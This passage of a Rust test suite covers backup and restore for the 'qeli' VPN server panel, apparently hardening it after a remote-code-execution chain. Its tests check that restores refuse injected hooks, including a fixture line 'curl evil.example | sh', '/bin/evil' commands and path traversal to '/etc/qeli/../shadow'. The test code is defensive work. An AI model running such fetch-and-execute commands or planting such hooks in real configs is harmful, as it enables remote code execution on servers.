                assert_eq!(std::fs::read_to_string("/etc/qeli/server.conf").unwrap(), raw);
            });
            let mut snapshots = 0;
            for entry in std::fs::read_dir("/etc/qeli").unwrap() {
                let entry = entry.unwrap();
                let name = entry.file_name().to_string_lossy().into_owned();
                assert!(!name.starts_with(".restore-upload-") && !name.starts_with(".restore-staging-"));
                if name.starts_with(".pre-restore-") {
                    snapshots += 1;
                    assert_eq!(entry.metadata().unwrap().permissions().mode() & 0o777, 0o600);
                }
            }
            assert_eq!(snapshots, 2);
        }).join().unwrap();
        let after = std::fs::metadata("/etc/qeli").unwrap();
        assert_eq!((original.dev(), original.ino()), (after.dev(), after.ino()));
    }

    #[test]
    #[ignore = "requires root to exercise tar under an unprivileged uid"]
    fn native_rollback_snapshot_refuses_unreadable_files() {
        use std::os::unix::fs::PermissionsExt;
        use std::os::unix::process::CommandExt;
        assert_eq!(unsafe { libc::geteuid() }, 0);
        let root = std::path::PathBuf::from(format!(
            "/tmp/qeli-snapshot-permissions-{}-{}",
            std::process::id(),
            rand::random::<u64>()
        ));
        std::fs::create_dir(&root).unwrap();
        struct Cleanup(std::path::PathBuf);
        impl Drop for Cleanup {
            fn drop(&mut self) {
                let _ = std::fs::remove_dir_all(&self.0);
            }
        }
        let _cleanup = Cleanup(root.clone());
        let config = root.join("qeli");
        std::fs::create_dir(&config).unwrap();
        for directory in [&root, &config] {
            std::fs::set_permissions(directory, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let file = config.join("server.conf");
        std::fs::write(&file, "fixture, no secrets").unwrap();
        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o644)).unwrap();
        let run = |ignore_failure: bool| {
            let mut command = create_archive_command(&root, false);
            command.uid(65534).gid(65534);
            if ignore_failure {
                command.arg("--ignore-failed-read");
            }
            crate::system_command::Command::from(command)
                .output_bounded(Instant::now() + Duration::from_secs(5), 64 * 1024, None)
                .unwrap()
        };
        assert!(run(false).status.success());
        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o000)).unwrap();
        let refused = run(false);
        assert!(
            !refused.status.success(),
            "rollback snapshot silently omitted a file"
        );
        assert!(String::from_utf8_lossy(&refused.stderr).contains("Permission denied"));
        // Reproduce the old flag's false-success policy with the same real tar/files.
        assert!(run(true).status.success());
    }

    #[tokio::test]
    async fn duplicate_restore_is_refused_before_waiting_for_config_lock() {
        let state =
            crate::server::test_api_state(Default::default(), Path::new("/unused/server.ini"));
        let _restore = RESTORE_LOCK.lock().await;
        let _writer = state.config_write_lock.lock().await;
        let response = tokio::time::timeout(
            Duration::from_millis(500),
            restore_backup(
                axum::extract::State(state.clone()),
                auth::AuthGuard,
                axum::extract::Query(RestoreQuery { exact: Some(true) }),
                Bytes::from_static(b"unused"),
            ),
        )
        .await
        .expect("duplicate restore queued behind config write")
        .unwrap();
        assert_eq!(response.status(), StatusCode::CONFLICT);
        let bytes = axum::body::to_bytes(response.into_body(), 4096)
            .await
            .unwrap();
        let reply: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(reply["error"], RESTORE_BUSY);
    }

    #[test]
    fn restore_storage_errors_are_not_archive_or_contention_errors() {
        for prefix in [
            "cannot lock server config for restore",
            "cannot lock runtime dependency for restore '/etc/qeli/users.conf'",
        ] {
            let busy = restore_lock_error(
                prefix,
                anyhow::anyhow!("timed out waiting for lock file after 5s"),
            );
            assert_eq!(restore_error_status(&busy), StatusCode::CONFLICT);
            let io = restore_lock_error(
                prefix,
                anyhow::anyhow!("cannot open the lock: Read-only file system"),
            );
            assert_eq!(restore_error_status(&io), StatusCode::INTERNAL_SERVER_ERROR);
        }
        assert_eq!(
            restore_error_status("extract failed: tar: Wrote only 1536 of 10240 bytes"),
            StatusCode::INTERNAL_SERVER_ERROR
        );
        assert_eq!(
            restore_error_status("not a gzip archive"),
            StatusCode::BAD_REQUEST
        );
    }

    #[test]
    fn exact_restore_preserves_retained_hook_dependencies_before_publication() {
        let root = std::env::temp_dir().join(format!(
            "qeli-hook-prune-{}-{}",
            std::process::id(),
            rand::random::<u64>()
        ));
        std::fs::create_dir(&root).unwrap();
        std::fs::create_dir(root.join("scripts")).unwrap();
        std::fs::write(root.join("scripts/down.txt"), "original").unwrap();
        std::fs::write(root.join("ordinary.txt"), "prunable").unwrap();
        let mut hooks = hook_paths::HookFiles::new(&root);
        hooks.add_command(&format!("sh {}", root.join("scripts/down.txt").display()));
        let absent = std::collections::HashSet::new();
        let error = vet_hook_pruning(&absent, &root, &hooks).unwrap_err();
        assert!(
            error.contains("scripts") && error.contains("delete"),
            "{error}"
        );
        assert_eq!(
            std::fs::read(root.join("scripts/down.txt")).unwrap(),
            b"original"
        );
        assert!(vet_hook_pruning(
            &std::collections::HashSet::from(["scripts".into()]),
            &root,
            &hooks
        )
        .is_ok());
        assert!(vet_hook_pruning(&absent, &root, &hook_paths::HookFiles::new(&root)).is_ok());
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn expired_restore_never_reaches_archive_or_live_path_handling() {
        let error = restore_blocking(
            b"not gzip",
            false,
            "/does/not/exist/server.ini",
            Instant::now(),
            &[],
        )
        .unwrap_err();
        assert!(
            error.error.contains("timed out before publication"),
            "{error:?}"
        );
    }

    #[tokio::test]
    async fn expired_archive_lock_does_not_admit_or_release_a_writer() {
        let state = crate::server::test_api_state(
            Default::default(),
            std::path::Path::new("/unused/server.ini"),
        );
        assert!(archive_lock(&state, Instant::now()).await.is_err());
        let guard = state.config_write_lock.lock().await;
        assert!(
            archive_lock(&state, Instant::now() + Duration::from_millis(20))
                .await
                .is_err()
        );
        assert!(state.config_write_lock.try_lock().is_err());
        drop(guard);
    }

    #[test]
    fn backup_excludes_transient_archives_and_legacy_secret() {
        assert!(TRANSIENT_TAR_EXCLUDES.contains(&"qeli/.pre-restore-*.tgz"));
        assert!(TRANSIENT_TAR_EXCLUDES.contains(&"qeli/.restore-upload-*.tgz"));
        assert!(TRANSIENT_TAR_EXCLUDES.contains(&"qeli/.restore-staging-*"));
        assert!(PORTABLE_TAR_EXCLUDES.contains(&"qeli/panel-secret.key"));
        assert!(PORTABLE_TAR_EXCLUDES.contains(&"qeli/notify.json"));
    }

    #[cfg(unix)]
    #[test]
    fn restore_normalizes_private_file_and_directory_modes() {
        use std::os::unix::fs::PermissionsExt;

        let root = std::env::temp_dir().join(format!(
            "qeli-restore-mode-test-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let nested = root.join("identity");
        std::fs::create_dir_all(&nested).unwrap();
        let key = nested.join("profile.key");
        std::fs::write(&key, b"secret").unwrap();
        std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o755)).unwrap();
        std::fs::set_permissions(&nested, std::fs::Permissions::from_mode(0o755)).unwrap();
        std::fs::set_permissions(&key, std::fs::Permissions::from_mode(0o644)).unwrap();

        normalize_staged_permissions(&root).unwrap();
        assert_eq!(
            std::fs::metadata(&root).unwrap().permissions().mode() & 0o777,
            0o700
        );
        assert_eq!(
            std::fs::metadata(&nested).unwrap().permissions().mode() & 0o777,
            0o700
        );
        assert_eq!(
            std::fs::metadata(&key).unwrap().permissions().mode() & 0o777,
            0o600
        );
        let _ = std::fs::remove_dir_all(root);
    }
    #[cfg(unix)]
    #[test]
    fn restore_refuses_alias_replacement_before_publication() {
        use std::os::unix::fs::{symlink, PermissionsExt};
        let base = std::env::temp_dir().join(format!(
            "qeli-restore-hook-test-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let live = base.join("managed");
        let staged = base.join("staged");
        std::fs::create_dir_all(&live).unwrap();
        std::fs::create_dir(&staged).unwrap();
        let name = "owned script.txt";
        std::fs::write(live.join(name), b"trusted script").unwrap();
        std::fs::write(staged.join(name), b"untrusted replacement").unwrap();
        std::fs::set_permissions(staged.join(name), std::fs::Permissions::from_mode(0o600))
            .unwrap();
        symlink(&live, base.join("outside")).unwrap();
        for command in [
            format!("sh '{}/../managed/{name}'", live.display()),
            format!("sh '{}/{name}'", live.display()),
            format!("sh '{}/outside/{name}'", base.display()),
            format!("sh {}/*.txt", live.display()),
        ] {
            let mut files = hook_paths::HookFiles::new(&live);
            files.add_command(&command);
            let error = vet_staged_dir(&staged, &live, &files).unwrap_err();
            assert!(
                error.contains("routing.post_up/post_down"),
                "{command}: {error}"
            );
            assert_eq!(std::fs::read(live.join(name)).unwrap(), b"trusted script");
            assert_eq!(
                std::fs::read(staged.join(name)).unwrap(),
                b"untrusted replacement"
            );
        }
        // Ordinary external hooks still permit data-only publication validation.
        let mut files = hook_paths::HookFiles::new(&live);
        files.add_command("/opt/site/up.sh");
        vet_staged_dir(&staged, &live, &files).unwrap();
        std::fs::remove_dir_all(base).unwrap();
    }

    #[test]
    fn panel_backup_refuses_external_or_ambiguous_active_paths() {
        let config = crate::config::server::ServerConfig::default();
        let outside = critical_backup_paths(&config, "/srv/qeli/server.conf").unwrap_err();
        assert!(outside.contains("outside /etc/qeli"));
        let relative = critical_backup_paths(&config, "server.conf").unwrap_err();
        assert!(relative.contains("relative"));
        let traversal = critical_backup_paths(&config, "/etc/qeli/../secret.conf").unwrap_err();
        assert!(traversal.contains("not a normal file"));
    }

    #[test]
    fn restore_requires_external_users_even_when_inline_users_exist() {
        let root = std::env::temp_dir().join(format!(
            "qeli-restore-users-test-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&root).unwrap();
        let config = format!(
            "[auth]\nusers_file = /etc/qeli/auth/users.conf\n\
             [user:inline]\npassword_hash = x\n{}",
            srv("")
        );
        std::fs::write(root.join("server.conf"), config).unwrap();
        let error = vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.conf")
            .expect_err("inline users do not make the configured external database optional");
        assert!(error.contains("requires users database"), "{error}");
        let _ = std::fs::remove_dir_all(root);
    }
    /// Minimal server config; `hooks` is spliced into the profile verbatim.
    fn srv(hooks: &str) -> String {
        format!(
            "[profile:p]\n\
             bind.address = 0.0.0.0\n\
             bind.port = 443\n\
             bind.transport = tcp\n\
             tun.name = vpn0\n\
             tun.address = 10.0.0.1\n\
             pool.cidr = 10.0.0.0/24\n\
             obf.mode = fake-tls\n\
             perf.connection.max_clients = 8\n\
             perf.connection.handshake_timeout_secs = 10\n\
             {hooks}"
        )
    }

    /// The exact-restore prune must key off the archive's file list captured BEFORE
    /// publishing. `publish_staged_tree` MOVES files out of staging, so a prune that
    /// re-reads staging afterwards sees an empty tree and deletes everything it just
    /// restored — `server.conf`, `users.conf`, profile identity keys — while reporting
    /// success. This test pins the contract that made that possible. (Р1)
    #[test]
    fn exact_prune_keeps_what_the_archive_delivered() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-prune-test-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let dest = dir.to_string_lossy().to_string();
        for f in [
            "server.conf",
            "users.conf",
            "leftover.conf",
            "server.conf.lock",
        ] {
            std::fs::write(dir.join(f), b"x").unwrap();
        }
        std::fs::write(dir.join(".pre-restore-1.tgz"), b"x").unwrap();

        // The archive carried server.conf + users.conf, but NOT leftover.conf.
        let archive: std::collections::HashSet<String> = ["server.conf", "users.conf"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let (removed, errors) = prune_absent(&archive, &dest);

        assert!(errors.is_empty(), "unexpected errors: {errors:?}");
        assert_eq!(
            removed, 1,
            "only the file absent from the archive should go"
        );
        assert!(
            dir.join("server.conf").exists(),
            "restored server.conf was deleted"
        );
        assert!(
            dir.join("users.conf").exists(),
            "restored users.conf was deleted"
        );
        assert!(
            !dir.join("leftover.conf").exists(),
            "stale file should have been pruned"
        );
        assert!(
            dir.join(".pre-restore-1.tgz").exists(),
            "the pre-restore snapshot is the only way back — it must never be pruned"
        );
        assert!(
            dir.join("server.conf.lock").exists(),
            "an exact restore must not unlink the writer's active lock inode"
        );

        // An empty/unreadable archive list must prune NOTHING rather than everything.
        let (removed2, errors2) = prune_absent(&std::collections::HashSet::new(), &dest);
        assert_eq!(
            removed2, 0,
            "an empty archive list must not delete anything"
        );
        assert!(!errors2.is_empty(), "and it must say why");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn restore_publication_does_not_replace_writer_lock_inode() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-restore-lock-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let staged = dir.join("staged");
        let live = dir.join("live");
        std::fs::create_dir_all(&staged).unwrap();
        std::fs::create_dir_all(&live).unwrap();
        std::fs::write(staged.join("server.conf"), b"new").unwrap();
        std::fs::write(staged.join("server.conf.lock"), b"archive lock").unwrap();
        std::fs::write(live.join("server.conf.lock"), b"active lock").unwrap();
        publish_staged_tree(staged.to_str().unwrap(), live.to_str().unwrap()).unwrap();
        assert_eq!(std::fs::read(live.join("server.conf")).unwrap(), b"new");
        assert_eq!(
            std::fs::read(live.join("server.conf.lock")).unwrap(),
            b"active lock"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn restore_cannot_introduce_a_server_hook() {
        // The link that made the chain RCE: an uploaded backup carrying a post_up that
        // the live config does not have. `/bin/sh -c` runs it at the next profile start.
        let staged = srv("routing.post_up = curl evil.example | sh\n");
        let live = srv("");
        let err = vet_config_file("server.conf", &staged, &live).unwrap_err();
        assert!(
            err.contains("post_up"),
            "a newly introduced hook must be refused, got: {err}"
        );
    }

    #[test]
    fn restore_keeps_working_on_a_server_that_legitimately_uses_hooks() {
        // The rule is "unchanged", not "empty" — otherwise restoring a backup taken on a
        // server whose operator set hooks in the file would always fail.
        let same = srv("routing.post_up = /opt/site/up.sh\n");
        assert!(vet_config_file("server.conf", &same, &same).is_ok());
    }

    #[cfg(unix)]
    #[test]
    fn restore_cannot_promote_hooks_from_untrusted_live_ini() {
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!(
            "qeli-restore-hook-trust-{}-{}",
            std::process::id(),
            rand::random::<u64>()
        ));
        std::fs::create_dir(&dir).unwrap();
        let live_path = dir.join("server.conf");
        let same = srv("routing.post_up = /opt/site/up.sh\n");
        std::fs::write(&live_path, &same).unwrap();
        std::fs::set_permissions(&live_path, std::fs::Permissions::from_mode(0o666)).unwrap();
        assert!(vet_config_file("server.conf", &same, &same).is_ok());
        let error = read_live_config_for_restore(&same, &live_path).unwrap_err();
        assert!(error.contains("group/world-writable"), "{error}");
        std::fs::set_permissions(&live_path, std::fs::Permissions::from_mode(0o600)).unwrap();
        assert!(read_live_config_for_restore(&same, &live_path).unwrap() == same);
        std::fs::remove_file(live_path).unwrap();
        std::fs::remove_dir(dir).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn restore_matches_nested_commands_to_their_nested_live_path() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-restore-nested-hook-{}-{}",
            std::process::id(),
            rand::random::<u64>()
        ));
        let staged = dir.join("staged");
        let live = dir.join("live");
        std::fs::create_dir_all(staged.join("nested")).unwrap();
        std::fs::create_dir_all(live.join("nested")).unwrap();
        let same = srv("routing.post_up = /opt/site/up.sh\n");
        std::fs::write(staged.join("nested/server.conf"), &same).unwrap();
        std::fs::write(live.join("server.conf"), &same).unwrap();
        let hooks = hook_paths::HookFiles::new(&live);
        assert!(
            vet_staged_dir(&staged, &live, &hooks).is_err(),
            "a top-level config cannot authorize commands in a nested file"
        );
        std::fs::write(live.join("nested/server.conf"), &same).unwrap();
        assert!(vet_staged_dir(&staged, &live, &hooks).is_ok());
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn restore_cannot_change_an_existing_server_hook() {
        let staged = srv("routing.post_up = /opt/site/evil.sh\n");
        let live = srv("routing.post_up = /opt/site/up.sh\n");
        assert!(vet_config_file("server.conf", &staged, &live).is_err());
    }

    #[test]
    fn restore_cannot_wedge_the_worker_with_a_bad_address() {
        // A config the panel would accept but the worker dies on — the crash-loop the
        // stricter validate_profiles now catches, reused here so a restore can't do it.
        let staged = srv("").replace("pool.cidr = 10.0.0.0/24", "pool.cidr = 10.0.0.0/33");
        let err = vet_config_file("server.conf", &staged, &srv("")).unwrap_err();
        assert!(
            err.contains("would not start"),
            "expected the validation gate to fire, got: {err}"
        );
    }

    #[test]
    fn restore_cannot_introduce_a_client_password_command() {
        // Executes on whoever imports the profile, so the same rule applies.
        let staged = "[qeli]\nserver = h:443\nuser = a\npassword_command = /bin/evil\n";
        let live = "[qeli]\nserver = h:443\nuser = a\n";
        assert!(vet_config_file("client-a.conf", staged, live).is_err());
    }

    #[test]
    fn restore_vets_the_active_server_config_without_a_conf_extension() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-restore-vet-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let root = dir.join("qeli");
        std::fs::create_dir_all(&root).unwrap();
        let active = root.join("server.ini");
        let users = root.join("users.conf");

        std::fs::write(&active, srv("")).unwrap();
        std::fs::write(&users, "").unwrap();
        std::fs::create_dir_all(root.join("identity")).unwrap();
        std::fs::write(root.join("identity/p.key"), [7u8; 32]).unwrap();
        assert!(vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini").is_ok());

        std::fs::write(&active, srv("routing.post_up = /bin/evil\n")).unwrap();
        let hook_error = vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini")
            .expect_err("a non-.conf main config must still be hook-vetted");
        assert!(hook_error.contains("post_up"), "{hook_error}");

        std::fs::write(&active, "this is not ini\n").unwrap();
        assert!(vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini").is_err());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn restore_requires_and_validates_the_users_file_named_by_main_config() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-restore-users-vet-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let root = dir.join("qeli");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("server.ini"), srv("")).unwrap();
        std::fs::create_dir_all(root.join("identity")).unwrap();
        std::fs::write(root.join("identity/p.key"), [7u8; 32]).unwrap();

        let missing = vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini")
            .expect_err("a non-inline configuration cannot start without its users file");
        assert!(missing.contains("users.conf"), "{missing}");

        std::fs::write(
            root.join("users.conf"),
            "[user:alice]\npassword_hash = hash\nallowed_networks = definitely-not-a-cidr\n",
        )
        .unwrap();
        let malformed = vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini")
            .expect_err("malformed access controls must not be restored");
        assert!(malformed.contains("allowed_networks"), "{malformed}");

        std::fs::write(
            root.join("users.conf"),
            "[user:alice]\npassword_hash = hash\nallowed_networks = 10.0.0.0/8\n",
        )
        .unwrap();
        assert!(vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini").is_ok());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn restore_rejects_unrecognised_conf_content() {
        let err = vet_config_file("broken.conf", "this is not a qeli config", "")
            .expect_err("unrecognised .conf content must not be published");
        assert!(err.contains("not a valid qeli"), "{err}");
    }

    #[test]
    fn restore_relative_paths_cannot_escape_qeli() {
        assert_eq!(
            qeli_relative_path("/etc/qeli/nested/users.conf").as_deref(),
            Some(std::path::Path::new("nested/users.conf"))
        );
        assert!(qeli_relative_path("/etc/qeli/../shadow").is_none());
        assert!(qeli_relative_path("/etc/qeli").is_none());
        assert!(qeli_relative_path("/etc/qeli-other/server.conf").is_none());
    }

    #[test]
    fn publish_shape_rejects_false_exactness_and_type_conflicts() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-restore-shape-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let staged = dir.join("staged");
        let live = dir.join("live");
        std::fs::create_dir_all(staged.join("identity")).unwrap();
        std::fs::create_dir_all(live.join("identity")).unwrap();
        std::fs::write(staged.join("identity/current.key"), "new").unwrap();
        std::fs::write(live.join("identity/current.key"), "old").unwrap();
        std::fs::write(live.join("identity/stale.key"), "stale").unwrap();

        assert!(vet_publish_shape(&staged, &live, false, 0).is_ok());
        let nested = vet_publish_shape(&staged, &live, true, 0)
            .expect_err("exact mode must not silently retain nested extras");
        assert!(nested.contains("stale.key"), "{nested}");

        std::fs::remove_file(live.join("identity/stale.key")).unwrap();
        assert!(vet_publish_shape(&staged, &live, true, 0).is_ok());

        std::fs::remove_dir_all(live.join("identity")).unwrap();
        std::fs::write(live.join("identity"), "not a directory").unwrap();
        let mismatch = vet_publish_shape(&staged, &live, false, 0)
            .expect_err("a file/directory mismatch must fail before publication");
        assert!(mismatch.contains("type mismatch"), "{mismatch}");

        let _ = std::fs::remove_dir_all(&dir);
    }
}

#[cfg(test)]
#[path = "backup_io_tests.rs"]
mod io_tests;
